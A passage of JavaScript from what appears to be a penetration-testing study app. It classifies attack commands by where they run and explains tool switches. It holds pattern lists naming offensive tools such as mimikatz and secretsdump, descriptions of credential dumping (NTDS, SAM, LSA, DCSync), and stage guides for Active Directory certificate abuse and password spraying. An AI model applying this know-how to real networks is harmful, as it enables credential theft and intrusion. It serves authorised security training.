      if (picked < 0) picked = 0; // cycle / external-only deps: take next in pack order
      var m = remaining.splice(picked, 1)[0];
      out.push(m); (m.produces || []).forEach(function (p) { produced[p] = true; });
    }
    return out;
  }

  function lanes() { return buildLanes().map(function (L) { return { key: L.key, name: L.name, short: L.short, desc: L.desc, count: L.nodes.length, firstId: L.nodes[0].id }; }); }
  function lane(key) { var Ls = buildLanes(); for (var i = 0; i < Ls.length; i++) if (Ls[i].key === key) return Ls[i].nodes.map(function (n) { return { id: n.id, phase: n.phase, category: categoryOf(n.id), laneKey: key, title: n.title, proves: n.proves, reqs: n.reqs }; }); return []; }
  function laneOfId(id) { var Ls = buildLanes(); for (var i = 0; i < Ls.length; i++) for (var j = 0; j < Ls[i].nodes.length; j++) if (Ls[i].nodes[j].id === id) return { lane: Ls[i], idx: j }; return null; }
  function laneEntry(moveId) { var r = laneOfId(moveId); if (!r) return null; return { id: moveId, phase: r.lane.nodes[r.idx].phase, laneKey: r.lane.key }; }
  function laneEdges(key) {
    var N = lane(key), edges = [];
    N.forEach(function (a, ai) { N.forEach(function (b, bi) { if (bi <= ai) return; if (a.proves.some(function (p) { return b.reqs.indexOf(p) >= 0; })) edges.push({ from: a.id, to: b.id }); }); });
    return edges;
  }
  function laneNext(moveId) { var r = laneOfId(moveId); if (!r) return null; return r.idx < r.lane.nodes.length - 1 ? r.lane.nodes[r.idx + 1].id : null; }

  // --- per-command locus & OS-accurate prompt detection ----------------------------------------
  var _REMOTE_TOOLS_RE = /^(ligolo-proxy|ligolo-ng|nmap|masscan|rustscan|arp-scan|fping|ping|traceroute|dig|host|nslookup|dnsenum|dnsrecon|fierce|whatweb|wafw00f|nikto|gobuster|ffuf|feroxbuster|dirb|dirsearch|wfuzz|wpscan|sqlmap|nuclei|httpx|katana|hakrawler|hydra|medusa|ncrack|crowbar|patator|nxc|netexec|crackmapexec|cme|evil-winrm|xfreerdp|rdesktop|vncviewer|smbclient|smbmap|enum4linux|enum4linux-ng|rpcclient|ldapsearch|bloodyAD|bloodhound-python|certipy|certipy-ad|responder|ntlmrelayx|mitm6|coercer|petitpotam|krbrelayx|impacket-[a-z0-9_-]+|GetNPUsers|GetUserSPNs|secretsdump|psexec|wmiexec|smbexec|atexec|dcomexec|findDelegation|getTGT|getST|ticketer|dacledit|owneredit|rbcd|addcomputer|lookupsid|samrdump|rpcdump|mssqlclient|redis-cli|mysql|psql|mongosh|mongo|sqlplus|odat|snmpwalk|onesixtyone|snmp-check|showmount|Swaks|swaks|smtp-user-enum|finger|ssh|sshpass|scp|sftp|sshuttle|proxychains4?|searchsploit|msfvenom|msfconsole|ysoserial)$/i;
  var _OFFLINE_TOOLS_RE = /^(hashcat|john|hashid|hash-identifier|nth|ssh2john|zip2john|rar2john|keepass2john|pfx2john|gpg2john|bitlocker2john|7z2john|office2john|pdf2john|unshadow|gpp-decrypt)$/i;
  var _ONHOST_WIN_CMD_RE = /(^|[\s|&;])(ipconfig|systeminfo|route\s+print|arp\s+-a|netstat\s+-ano|whoami(\s+\/(?:all|priv|groups))?|sc(?:\.exe)?\s+(?:qc|query|config|stop|start|failure)|schtasks|reg\s+(?:query|add|save)|cmdkey|icacls|accesschk|cacls|wmic|net\s+(?:user|localgroup|share|use|accounts|view|start)|netsh|dir\s+\/[sba]|type\s+[A-Za-z]:\\|findstr|tasklist|driverquery|wevtutil|certutil|msiexec|runas|winPEAS|Seatbelt|Sharp[A-Za-z0-9_]+|Rubeus|Certify|Mimikatz|mimikatz|GodPotato|PrintSpoofer|JuicyPotato|SweetPotato|RoguePotato|lazagne)/i;
  var _ONHOST_PS_RE = /(^|[\s|&;])(powershell(?:\.exe)?|pwsh|Get-[A-Za-z]+|Set-[A-Za-z]+|New-[A-Za-z]+|Invoke-[A-Za-z]+|Import-Module|Start-Process|Select-String|Out-File|ConvertTo-SecureString|\$env:|\[System\.)/i;
  var _ONHOST_LIN_RE = /(^|[\s|&;])(id|uname\s+-|sudo\s+-[lnV]|sudo\s+\/|sudoedit|find\s+\/|getcap|crontab|ps\s+aux|ss\s+-[tulpna]+|ip\s+-(?:br|-brief|[46]|o)?\s*(?:addr|route|neigh|link|a|r)|ifconfig|cat\s+\/(?:etc|proc|var|home|root|opt)|ls\s+-[la]+\s+\/|chmod\s+\+[xs]|chown\s+|export\s+(?:PATH|LD_PRELOAD|LD_LIBRARY_PATH|TERM)|linpeas|lse\.sh|pspy(?:32|64)?|linux-exploit-suggester|pkexec|docker\s+run|lxc\s+|lxd\s+)/;

  function cmdLocus(c) {
    if (!c) return { rank: 0, tag: 'Remote · From Your Box', label: 'REMOTE' };
    var run = String(c.run || c.cmd || c || '').trim();
    var tool = String(c.tool || '').trim();
    var whereHint = String(c.where || c.locus || '').toLowerCase();
    if (whereHint === 'offline') return { rank: 1, tag: 'Offline · Your Box', label: 'OFFLINE' };
    if (whereHint === 'onhost' || whereHint === 'target' || whereHint === 'host' || whereHint === 'on-target') {
      return { rank: 2, tag: 'On-Target · Needs a Foothold', label: 'ON-TARGET' };
    }
    if (whereHint === 'remote' || whereHint === 'local') {
      if (/(^|[\s|&;])(hashcat|john|\S*2john|unshadow|gpp-decrypt)\b/i.test(run) || _OFFLINE_TOOLS_RE.test(tool)) {
        return { rank: 1, tag: 'Offline · Your Box', label: 'OFFLINE' };
      }
      return { rank: 0, tag: 'Remote · From Your Box', label: 'REMOTE' };
    }
    var A = arsenal(), e = A[tool] || A[tool.toLowerCase()] || {};
    var firstTok = run.replace(/^\s*(?:sudo\s+|proxychains4?\s+(?:-q\s+)?)/i, '').split(/\s+/)[0] || '';
    var baseBin = firstTok.replace(/^.*[/\\]/, '').replace(/\.(?:py|sh|pl|rb)$/i, '');

    if (/(^|[\s|&;])(hashcat|john|\S*2john|unshadow|gpp-decrypt|hashid)\b/i.test(run) || _OFFLINE_TOOLS_RE.test(tool) || _OFFLINE_TOOLS_RE.test(baseBin) || /\s-m\s+\d+/.test(run)) {
      return { rank: 1, tag: 'Offline · Your Box', label: 'OFFLINE' };
    }
    // If explicitly invoked via a remote tool from Kali (ssh, sshpass, nxc, evil-winrm, impacket, curl, nmap, etc.)
    if (_REMOTE_TOOLS_RE.test(baseBin) || _REMOTE_TOOLS_RE.test(tool) || /^(ssh|sshpass|nxc|netexec|evil-winrm|impacket-|curl|wget|nmap|gobuster|ffuf|feroxbuster|sqlmap|hydra|smbclient|rpcclient|ldapsearch|bloodyAD|certipy|xfreerdp)/i.test(firstTok)) {
      // Exception: curl/wget downloading from {{lhost}} onto /tmp or C:\Windows\Temp is run ON-TARGET
      if (/^(curl|wget|certutil|iwr|Invoke-WebRequest)$/i.test(baseBin) && (/\{\{lhost\}\}|10\.10\.14\.5|\/tmp\/|\/dev\/shm|C:\\Windows\\Temp/i.test(run))) {
        return { rank: 2, tag: 'On-Target · Needs a Foothold', label: 'ON-TARGET' };
      }
      return { rank: 0, tag: 'Remote · From Your Box', label: 'REMOTE' };
    }
    if (e.os === 'windows' || /^(stage-win|stage-lin|material)$/.test(e.class || '') || /(^|\s)\.[\\/]/.test(run) || _ONHOST_WIN_CMD_RE.test(run) || _ONHOST_PS_RE.test(run) || _ONHOST_LIN_RE.test(run)) {
      return { rank: 2, tag: 'On-Target · Needs a Foothold', label: 'ON-TARGET' };
    }
    return { rank: 0, tag: 'Remote · From Your Box', label: 'REMOTE' };
  }

  function detectPrompt(run, tool, whereHint, osHint) {
    var s = String(run || '').trim();
    var t = String(tool || '').toLowerCase();
    var w = String(whereHint || '').toLowerCase();
    var os = Array.isArray(osHint) ? String(osHint[0] || '').toLowerCase() : String(osHint || '').toLowerCase();

    var L = cmdLocus({ run: s, tool: t, where: w });
    var isTarget = (w === 'host' || w === 'target' || w === 'onhost' || w === 'on-target' || L.label === 'ON-TARGET');
    if (!isTarget) return 'kali$';

    if (t === 'powershell' || t === 'pwsh' || t === 'powerview' || _ONHOST_PS_RE.test(s) || /^\*Evil-WinRM\*/i.test(s)) {
      return 'PS C:\\>';
    }
    if (t === 'cmd' || os === 'windows' || _ONHOST_WIN_CMD_RE.test(s) || /[A-Za-z]:\\/.test(s) || /\.(?:exe|bat|vbs|msi)\b/i.test(s)) {
      return 'C:\\>';
    }
    return 'target$';
  }

  // --- switch & argument breakdown + syntax tokenizer ------------------------------------------
  var _UNIVERSAL_SWITCHES = {
    '-u': 'Target URL or username for authentication.',
    '-p': 'Password or port number/range to scan or connect to.',
    '-H': 'NTLM hash for Pass-the-Hash, or custom HTTP request header.',
    '-d': 'Target Active Directory domain name or HTTP POST body data.',
    '-i': 'Target IP/hostname (evil-winrm), identity key file (ssh), or interface.',
    '-k': 'Use Kerberos authentication (-k) or skip TLS certificate verification (curl -k).',
    '-x': 'Execute a command via cmd.exe on the remote Windows host.',
    '-X': 'Execute a PowerShell command on the remote Windows host, or set the HTTP method (curl -X).',
    '-w': 'Path to the wordlist file used for fuzzing or brute-forcing.',
    '-o': 'Write output to the specified file path or pass module options.',
    '-oN': 'Save normal human-readable Nmap output to a file.',
    '-oG': 'Save grepable Nmap output to a file.',
    '-oA': 'Save Nmap output in all three major formats (normal, XML, grepable).',
    '-sC': 'Run Nmap default NSE scripts against open ports.',
    '-sV': 'Probe open ports to determine service and version info.',
    '-sT': 'Run a full TCP connect scan (required through SOCKS / proxychains).',
    '-sU': 'Run a UDP port scan.',
    '-sn': 'Host discovery only (ping sweep) without port scanning.',
    '-Pn': 'Skip host discovery and treat all targets as online.',
    '-p-': 'Scan all 65,535 TCP ports.',
    '--open': 'Show only open (or possibly open) ports.',
    '-v': 'Verbose output.',
    '-lvnp': 'Listen (-l) verbosely (-v) with numeric IPs (-n) on port (-p).',
    '-s': 'Silent mode (curl -s) or script scan.',
    '-L': 'Follow HTTP redirects (curl -L), list SMB shares (smbclient -L), or local SSH port forward.',
    '-D': 'Open a local dynamic SOCKS proxy port over SSH.',
    '-R': 'Reverse port forward or recursive operation.',
    '-N': 'Do not execute a remote command (SSH tunnel only) or use no password (smbclient -N).',
    '-f': 'Background SSH after authentication, or force operation.',
    '-m': 'Hashcat hash-type mode number.',
    '-a': 'Hashcat attack mode (0 = straight wordlist, 3 = brute-force mask).',
    '--show': 'Display already-cracked hashes from the potfile.',
    '--format': 'Specify the hash format explicitly for John the Ripper.',
    '--wordlist': 'Specify the password wordlist file for John the Ripper.',
    '-l': 'List sudo rights for the current user (sudo -l) or specify login username.',
    '-perm': 'Match files with specific permission bits (e.g. -4000 for SUID, -2000 for SGID).',
    '-type': 'Filter find results by file type (f = regular file, d = directory).',
    '-tulpn': 'Show listening (-l) TCP (-t) and UDP (-u) sockets with numeric ports (-n) and process IDs (-p).',
    '--kerberoasting': 'Query LDAP for user accounts with SPNs and request RC4/AES TGS service tickets for offline cracking.',
    '--asreproast': 'Request AS-REP hashes for accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH).',
    '--shares': 'Enumerate SMB shares and check READ/WRITE permissions for the current session.',
    '--users': 'Enumerate domain user accounts, descriptions, and bad-password counts.',
    '--groups': 'Enumerate domain groups and member counts.',
    '--local-groups': 'Enumerate local groups on the target host (e.g. Administrators, Remote Management Users).',
    '--loggedon-users': 'List users currently logged into the target host interactively or over the network.',
    '--sessions': 'List active SMB network sessions connected to the target host.',
    '--rid-brute': 'Brute-force Relative Identifiers (RIDs 500+) over LSARPC to enumerate domain users and groups without credentials.',
    '--pass-pol': 'Dump the domain password complexity, minimum length, and account lockout threshold policy.',
    '--local-auth': 'Authenticate against the target host\'s local SAM database instead of Active Directory.',
    '--continue-on-success': 'Keep testing remaining usernames/targets after finding a valid login instead of stopping at the first hit.',
    '--ntds': 'Dump Active Directory NTDS.dit password hashes from a Domain Controller via DRSUAPI.',
    '--sam': 'Dump local SAM account NTLM hashes from the registry (requires Local Admin).',
    '--lsa': 'Dump LSA secrets (service account passwords, cached logons) from the registry (requires Local Admin).',
    '--laps': 'Read LAPS (Local Administrator Password Solution) cleartext passwords from LDAP.',
    '--gmsa': 'Read Group Managed Service Account (gMSA) password blobs from LDAP and compute their NTLM hashes.',
    '--bloodhound': 'Run remote BloodHound AD data collection and export JSON zip archives for graph analysis.',
    '--admin-count': 'Query LDAP for high-value accounts and groups protected by AdminSDHolder (adminCount=1).',
    '--trusted-for-delegation': 'Find accounts and computers configured for unconstrained Kerberos delegation.',
    '--spider': 'Spider a specified SMB share for filenames or content matching a pattern.',
    '--put-file': 'Upload a local file from Kali onto a writable SMB share.',
    '--get-file': 'Download a remote file from an SMB share onto Kali.',
    '-M': 'Load and run a NetExec post-exploitation or enumeration module (e.g. spider_plus, lsassy, adcs, gpp_password).',
    '-dc-ip': 'IP address of the Domain Controller (KDC / LDAP server) to contact.',
    '--dc-ip': 'IP address of the Domain Controller (KDC / LDAP server) to contact.',
    '--dc': 'IP address or hostname of the Domain Controller to contact.',
    '--host': 'Hostname or IP address of the target Domain Controller / server.',
    '-request': 'Request TGS/TGT tickets from the KDC and output them in crackable format.',
    '-request-user': 'Request a Kerberoast TGS ticket specifically for the named target user.',
    '-outputfile': 'Write captured Kerberos hashes directly to the specified output file.',
    '-usersfile': 'File containing candidate usernames (one per line) to probe.',
    '-no-pass': 'Skip password prompt (for unauthenticated probes or when using a Kerberos ticket with -k).',
    '-hashes': 'Authenticate via Pass-the-Hash using LMHASH:NTHASH or :NTHASH.',
    '-just-dc': 'Extract only NTDS.dit data (NTLM hashes and Kerberos keys) via DRSUAPI without touching local SAM.',
    '-just-dc-ntlm': 'Extract only NTLM hashes from NTDS.dit via DRSUAPI DCSync.',
    '-just-dc-user': 'Extract NTDS.dit credentials only for the single specified username (stealthy targeted DCSync).',
    '-vulnerable': 'Filter Certipy output to display only certificate templates and CAs with exploitable ESC misconfigurations.',
    '-stdout': 'Print enumeration results directly to standard output in the terminal.',
    '-pfx': 'Path to the PKCS#12 (.pfx / .p12) certificate and private key file.',
    '-template': 'Name of the Active Directory Certificate Services (ADCS) template to target.',
    '-upn': 'Subject Alternative Name UPN (e.g. administrator@domain) to embed in the requested certificate.',
    '-ca': 'Name of the target Enterprise Certificate Authority.',
    '-save-old': 'Backup the original certificate template configuration to JSON before modifying its ACL.',
    '-configuration': 'Restore a certificate template\'s configuration from a saved JSON backup file.',
    '--quiet': 'Suppress banner and status noise, printing only cracked hashes or direct results.',
    '-O': 'Enable optimized Hashcat kernels (faster cracking speed for passwords under 32 characters).',
    '-r': 'Apply a Hashcat permutation rule file (e.g. best64.rule) or recurse directories.'
  };

  function _toolAwareSwitchDesc(flagBase, cleanBin) {
    var b = String(cleanBin || '').toLowerCase();
    var isWebFuzz = /^(ffuf|gobuster|feroxbuster|dirsearch|wfuzz|sqlmap|nikto|whatweb|wpscan|nuclei|arjun|cewl)$/i.test(b);
    var isCurl = /^curl$/i.test(b);
    if (flagBase === '-u' || flagBase === '--url') {
      if (isWebFuzz || isCurl) return 'Target URL endpoint to scan, fuzz, or request.';
      return 'Username (or user list file) for authentication.';
    }
    if (flagBase === '-p') {
      if (/^(nmap|rustscan|masscan|ssh|nc|ncat|netcat|chisel|socat|sshuttle|mysql|psql|redis-cli)$/i.test(b)) {
        return 'Target port number or port range to scan or connect to.';
      }
      return 'Password (or password list file) for authentication.';
    }
    if (flagBase === '-H') {
      if (isWebFuzz || isCurl) return 'Custom HTTP request header (e.g. Host, Cookie, Authorization, Content-Type).';
      if (/^ldapsearch$/i.test(b)) return 'LDAP server URI (e.g. ldap://10.10.10.10).';
      return 'NTLM hash for Pass-the-Hash authentication (no plaintext password needed).';
    }
    if (flagBase === '-d') {
      if (isWebFuzz || isCurl) return 'HTTP POST request body data.';
      return 'Target Active Directory domain FQDN.';
    }
    if (flagBase === '-k') {
      if (isWebFuzz || isCurl) return 'Allow insecure TLS connections without verifying the server certificate.';
      return 'Use Kerberos authentication (reads TGT/TGS from KRB5CCNAME ccache).';
    }
    if (flagBase === '-x') {
      if (/^(feroxbuster|gobuster|dirsearch)$/i.test(b)) return 'File extensions to append during directory/file discovery.';
      if (/^ldapsearch$/i.test(b)) return 'Use simple authentication (or anonymous bind) instead of SASL.';
      return 'Execute a command via cmd.exe on the remote Windows host.';
    }
    if (flagBase === '-X') {
      if (isWebFuzz || isCurl) return 'Specify the HTTP request method (e.g. POST, PUT, OPTIONS).';
      return 'Execute a PowerShell command on the remote Windows host.';
    }
    if (flagBase === '-i') {
      if (/^evil-winrm$/i.test(b)) return 'Target host IP address or FQDN to connect to over WinRM.';
      if (/^(ssh|scp|sftp)$/i.test(b)) return 'Private SSH identity key file (e.g. id_rsa) for key-based login.';
      if (/^(responder|tcpdump|wireshark|tshark|chisel|ligolo)$/i.test(b)) return 'Network interface (e.g. tun0) to bind or listen on.';
    }
    return '';
  }

  function _resolveGlossaryEntry(firstBin, toolName) {
    var G = OBOL.TOOL_GLOSSARY || {};
    var cands = [
      firstBin,
      firstBin.toLowerCase(),
      firstBin.replace(/^impacket-/i, ''),
      firstBin.replace(/\.(?:py|exe|sh|ps1|pl|rb)$/i, ''),
      toolName,
      String(toolName || '').toLowerCase()
    ];
    if (/^(netexec|cme|crackmapexec)$/i.test(firstBin)) cands.unshift('nxc');
    for (var i = 0; i < cands.length; i++) {
      var k = cands[i];
      if (k && G[k]) return { key: k, entry: G[k] };
    }
    return { key: firstBin || toolName || 'cmd', entry: null };
  }

  function _classifyFlagRole(flagText, descText) {
    var f = String(flagText || '');
    var d = String(descText || '').toLowerCase();
    if (/^(-u|-p|-H|-k|-P|--hashes|--no-pass|--kerberos|-U|-W|-A|--pw-nt-hash|--aesKey|-d|--domain)$/i.test(f) || /password|username|credential|ntlm|kerberos|hash|login|auth/i.test(d)) {
      return { role: 'auth', roleLabel: 'Auth / Identity' };
    }
    if (/^(-i|-h|--host|-dc-ip|-ns|--target|-t|-r|--url)$/i.test(f) || /target|host|domain controller|endpoint|address|url/i.test(d)) {
      return { role: 'target', roleLabel: 'Target / Scope' };
    }
    if (/^(-x|-X|-c|-e|--exec|--command|--data|--data-binary|--data-urlencode|-M)$/i.test(f) || /execute|command|payload|module|shell|upload|script/i.test(d)) {
      return { role: 'payload', roleLabel: 'Action / Payload' };
    }
    return { role: 'mode', roleLabel: 'Switch / Option' };
  }

  function switchesFor(cmdStr, toolName) {
    var raw = stripPrompt(String(cmdStr || '')).trim();
    if (!raw || raw.charAt(0) === '#') return [];
    // Split on top-level command separators if chained, but focus on the primary command
    var tokens = raw.match(/(?:"[^"]*"|'[^']*'|\S)+/g) || [];
    if (!tokens.length) return [];

    var idx = 0;
    var out = [];
    // Handle prefix wrappers like sudo or proxychains4
    if (/^(sudo|proxychains4?|rlwrap|stdbuf)$/i.test(tokens[0]) && tokens.length > 1) {
      var wrap = tokens[0];
      var wrapG = _resolveGlossaryEntry(wrap, wrap);
      out.push({
        token: wrap,
        role: 'tool',
        roleLabel: 'Wrapper',
        desc: (wrapG.entry && wrapG.entry.what) || (wrap.toLowerCase() === 'sudo' ? 'Run the following command as root or another specified user.' : 'Route the following command through a configured proxy or terminal wrapper.')
      });
      idx++;
      while (idx < tokens.length && tokens[idx].charAt(0) === '-') {
        var wf = tokens[idx];
        out.push({
          token: wf,
          role: 'mode',
          roleLabel: 'Wrapper Flag',
          desc: (wrapG.entry && wrapG.entry.flags && wrapG.entry.flags[wf]) || _UNIVERSAL_SWITCHES[wf] || 'Option flag for ' + wrap + '.'
        });
        idx++;
      }
    }

    var binTok = tokens[idx] || tokens[0];
    var cleanBin = binTok.replace(/^.*[/\\]/, '');
    var gRes = _resolveGlossaryEntry(cleanBin, toolName);
    var gEntry = gRes.entry;
    var gFlags = (gEntry && gEntry.flags) || {};

    out.push({
      token: binTok,
      role: 'tool',
      roleLabel: 'Tool / Binary',
      desc: (gEntry && gEntry.what) || ('Primary command or binary (' + cleanBin + ').')
    });

    var seen = {};
    seen[binTok] = 1;

    for (var i = idx + 1; i < tokens.length; i++) {
      var tok = tokens[i];
      if (!tok || seen[tok]) continue;
      if (/^(\|\||&&|\||;|2>\/dev\/null|>|<)$/.test(tok)) {
        if (tok === '2>/dev/null') {
          seen[tok] = 1;
          out.push({ token: tok, role: 'mode', roleLabel: 'Redirection', desc: 'Discard standard error (permission denied / noise) so only clean hits print.' });
        }
        continue;
      }

      // Check if token is a known subcommand/protocol in gFlags
      var stripped = tok.replace(/^['"]|['"]$/g, '');
      var eqIdx = tok.indexOf('=');
      var flagBase = eqIdx > 0 ? tok.slice(0, eqIdx) : tok;

      if (gFlags[tok] || gFlags[flagBase] || gFlags[stripped]) {
        var desc = gFlags[tok] || gFlags[flagBase] || gFlags[stripped];
        var isSub = tok.charAt(0) !== '-' && i === idx + 1;
        var rInfo = isSub ? { role: 'sub', roleLabel: 'Subcommand / Protocol' } : _classifyFlagRole(flagBase, desc);
        seen[tok] = 1;
        out.push({ token: tok, role: rInfo.role, roleLabel: rInfo.roleLabel, desc: desc });
        continue;
      }

      // Check combined flag + value in gFlags (e.g., "-type f", "-o StrictHostKeyChecking=no")
      if (tok.charAt(0) === '-' && i + 1 < tokens.length) {
        var pair = tok + ' ' + tokens[i + 1];
        if (gFlags[pair]) {
          var rInfo2 = _classifyFlagRole(tok, gFlags[pair]);
          seen[pair] = 1;
          out.push({ token: pair, role: rInfo2.role, roleLabel: rInfo2.roleLabel, desc: gFlags[pair] });
          i++;
          continue;
        }
      }

      // Universal switch fallback for flags starting with - or /
      if (tok.charAt(0) === '-' || (/^\/[a-zA-Z]{1,6}$/.test(tok) && !tok.includes('/', 1))) {
        var uDesc = _toolAwareSwitchDesc(flagBase, cleanBin) || _UNIVERSAL_SWITCHES[flagBase] || _UNIVERSAL_SWITCHES[tok];
        if (!uDesc) {
          // Check combined short flags like -lvnp or -sCV
          if (/^-[a-zA-Z]{2,5}$/.test(tok)) {
            uDesc = 'Combined CLI flags (' + tok.slice(1).split('').map(function (c) { return '-' + c; }).join(' ') + ') controlling output verbosity and execution mode.';
          } else {
            uDesc = 'Command-line switch passed to ' + cleanBin + '.';
          }
        }
        var rInfo3 = _classifyFlagRole(flagBase, uDesc);
        seen[tok] = 1;
        out.push({ token: tok, role: rInfo3.role, roleLabel: rInfo3.roleLabel, desc: uDesc });
        continue;
      }

      // Target / placeholder / URL / IP token
      if (/\{\{\w+\}\}|<\w+>|^https?:\/\/|^\d{1,3}(?:\.\d{1,3}){3}/.test(tok)) {
        seen[tok] = 1;
        var isCredTok = /user|pass|hash/i.test(tok);
        out.push({
          token: tok,
          role: isCredTok ? 'auth' : 'target',
          roleLabel: isCredTok ? 'Auth / Identity' : 'Target / Endpoint',
          desc: isCredTok ? 'Credential parameter filled from your active engagement state.' : 'Target host, IP address, or URL endpoint under test.'
        });
      }
    }
    return out.slice(0, 8);
  }

  function tokenizeCmd(cmdStr, toolName) {
    var raw = stripPrompt(String(cmdStr || '')).trim();
    if (!raw) return [];
    var parts = raw.match(/(?:\s+|"[^"]*"|'[^']*'|\S+)/g) || [];
    var sw = switchesFor(raw, toolName);
    var roleMap = {};
    sw.forEach(function (s) {
      roleMap[s.token] = s.role;
      var sp = s.token.split(' ');
      if (sp.length > 1) sp.forEach(function (p) { if (!roleMap[p]) roleMap[p] = s.role; });
    });

    var seenTool = false;
    return parts.map(function (p) {
      if (/^\s+$/.test(p)) return { text: p, role: 'space' };
      if (!seenTool && !/^(sudo|proxychains4?)$/i.test(p)) {
        seenTool = true;
        return { text: p, role: 'tool' };
      }
      if (roleMap[p]) return { text: p, role: roleMap[p] };
      if (/\{\{\w+\}\}|<\w+>|^https?:\/\/|^\d{1,3}(?:\.\d{1,3}){3}/.test(p)) {
        return { text: p, role: /user|pass|hash|Autumn2026/i.test(p) ? 'auth' : 'target' };
      }
      if (p.charAt(0) === '-') return { text: p, role: 'mode' };
      if (/^['"].*['"]$/.test(p)) return { text: p, role: 'payload' };
      return { text: p, role: 'arg' };
    });
  }

  // --- blockers & field doctors for a move -----------------------------------------------------
  function blockersFor(moveId) {
    var m = byId(moveId); if (!m) return [];
    var out = [], seen = {};
    var fnArr = (OBOL.FIELD_NOTES || {})[moveId] || [];
    var doctors = OBOL.FIELD_DOCTORS || {};

    fnArr.forEach(function (fn) {
      if (fn && fn.doctor && fn.doctor.title && !seen[fn.doctor.title]) {
        seen[fn.doctor.title] = 1;
        out.push({
          error: fn.doctor.error || 'DIAGNOSTIC',
          title: fn.doctor.title,
          why: fn.doctor.why || '',
          body: fn.doctor.body || '',
          code: fn.doctor.code || '',
          fixCmd: fn.doctor.code || ''
        });
      }
      (fn.mistakes || []).forEach(function (ms) {
        var key = 'm:' + ms.slice(0, 40);
        if (!seen[key]) {
          seen[key] = 1;
          out.push({
            error: 'PITFALL',
            title: 'Common Operator Pitfall',
            why: ms,
            body: fn.win ? ('What success looks like instead: ' + fn.win) : 'Verify command flags and target reachability before retrying.',
            code: '',
            fixCmd: ''
          });
        }
      });
    });

    // Match relevant reactive FIELD_DOCTORS by move category / tool
    var cmdText = (m.commands || []).map(function (c) { return c.run || ''; }).join(' ').toLowerCase();
    var docKeys = [];
    if (/kerberos|getst|gettgt|asrep|kerberoast|-k\b|certipy/.test(cmdText)) docKeys.push('blocker.clock_skew', 'blocker.kerberos_spn');
    if (/nxc\s+smb|smbclient|impacket-/.test(cmdText)) docKeys.push('blocker.logon_failure', 'blocker.nxc_c_share_denied');
    if (/ldapsearch|--users|--bloodhound|bloodhound-python/.test(cmdText)) docKeys.push('blocker.ldap_anonymous_disabled', 'blocker.nxc_bh_config');
    if (/secretsdump|-just-dc/.test(cmdText)) docKeys.push('blocker.dcsync_denied');
    if (/hashcat|john/.test(cmdText)) docKeys.push('blocker.hash_format', 'blocker.cracking_exhausted');
    if (/sudo\s+/.test(cmdText)) docKeys.push('blocker.no_tty');
    if (/ssh\s+|-i\s+id_rsa/.test(cmdText)) docKeys.push('ssh.key_rejected');
    if (/ffuf|gobuster|feroxbuster/.test(cmdText)) docKeys.push('blocker.web_wildcard', 'blocker.rate_limited');
    if (/evil-winrm|5985/.test(cmdText)) docKeys.push('blocker.winrm_closed');
    if (/potato|seimpersonate/i.test(cmdText + ' ' + moveId)) docKeys.push('blocker.potato');

    docKeys.forEach(function (dk) {
      var d = doctors[dk];
      if (d && !seen[d.title]) {
        seen[d.title] = 1;
        out.push({
          error: dk,
          title: d.title,
          why: d.why || '',
          body: d.body || '',
          code: d.code || '',
          fixCmd: d.code || ''
        });
      }
    });

    return out.slice(0, 5);
  }

  // --- derived graph edges ---------------------------------------------------------------------
  function producersOf(facts) { if (!facts || !facts.length) return []; return allMoves().filter(function (m) { return (m.produces || []).some(function (p) { return facts.indexOf(p) >= 0; }); }); }
  function opensNext(m) { var prod = m.produces || []; if (!prod.length) return []; return allMoves().filter(function (x) { return x.id !== m.id && reqSet(x).some(function (r) { return prod.indexOf(r) >= 0; }); }); }

  // --- "how you got here": the plausible lead-up chain to a move ---------------------------------
  function pathTo(moveId) {
    var target = byId(moveId); if (!target) return [];
    var inset = {}; inset[moveId] = true;
    var stack = [target], guard = 0;
    while (stack.length && guard++ < 1000) {
      var m = stack.pop();
      producersOf(reqSet(m)).forEach(function (p) { if (p.id === m.id || inset[p.id]) return; inset[p.id] = true; stack.push(p); });
    }
    var moves = Object.keys(inset).map(byId).filter(Boolean);
    var ordered = topoOrder(moves).map(function (m) { return m.id; });
    return ordered.filter(function (id) { return id !== moveId; }).concat([moveId]);
  }
  function leadupFor(moveId) { var fx = fixtures()[moveId] || {}; return (fx.leadup && fx.leadup.length) ? fx.leadup.slice() : null; }

  function applyProfile(run, tool, profile) {
    if (!profile || !tool || !profile.tools) return run;
    var p = profile.tools[tool] || profile.tools[tool.toLowerCase()];
    if (!p || !p.invocation || p.present === false) return run;
    return run.replace(new RegExp('^\\s*' + tool.replace(/[.*+?^${}()|[\]\\]/g, '\\\$&')), p.invocation);
  }

  function nextPreviewFor(moveId) {
    var m = byId(moveId); if (!m) return [];
    var opens = opensNext(m).slice(0, 4);
    return opens.map(function (nx) {
      var c0 = (nx.commands && nx.commands[0]) || {};
      var run = (c0.run || '').replace(/\{\{(\w+)\}\}/g, '<$1>');
      return {
        id: nx.id,
        title: nx.title,
        phase: deriveStage(nx),
        when: deriveStage(nx),
        tool: c0.tool || '',
        cmd: run,
        prompt: detectPrompt(run, c0.tool, c0.where, nx.os),
        whyNext: nx.proves || nx.hypothesis || ''
      };
    });
  }

  // --- Goal-Based Multi-Tool Combination Pipelines & Stage Hubs --------------------------------
  var STUDY_HUBS = {
    'nxc-arsenal': {
      lead: 'NetExec (nxc) spans four distinct stages of an Active Directory engagement. Pick your current stage below to see the exact prerequisites, command pipeline, and dedicated deep-dive module.',
      stages: [
        { key: 's1', label: '1. Unauth & Recon', prereq: 'Target IP + Port 445/389 (No Creds)' },
        { key: 's2', label: '2. Validate & Spray', prereq: 'Username/List + Password or NT Hash' },
        { key: 's3', label: '3. Enum, Roast & Spider', prereq: '1 Valid Domain User Account' },
        { key: 's4', label: '4. Admin Exec & Dump', prereq: 'Local / Domain Admin (Pwn3d!)' }
      ]
    },
    'adcs-esc': {
      lead: 'Active Directory Certificate Services (ADCS) abuse is always a multi-step pipeline: enumerate vulnerable templates, request/relay for a certificate, and authenticate via PKINIT to extract the NT hash.',
      stages: [
        { key: 's1', label: '1. Discover Templates', prereq: 'Valid Domain User' },
        { key: 's2', label: '2. Direct Enroll (ESC1/3)', prereq: 'Enroll Rights on Vulnerable Template' },
        { key: 's3', label: '3. ACL & CA Abuse (ESC4/7)', prereq: 'WriteDacl on Template or ManageCA' },
        { key: 's4', label: '4. Relay, UPN & On-Target', prereq: 'HTTP Web Enroll (ESC8) or Foothold' }
      ]
    },
    'bloodyad-acl': {
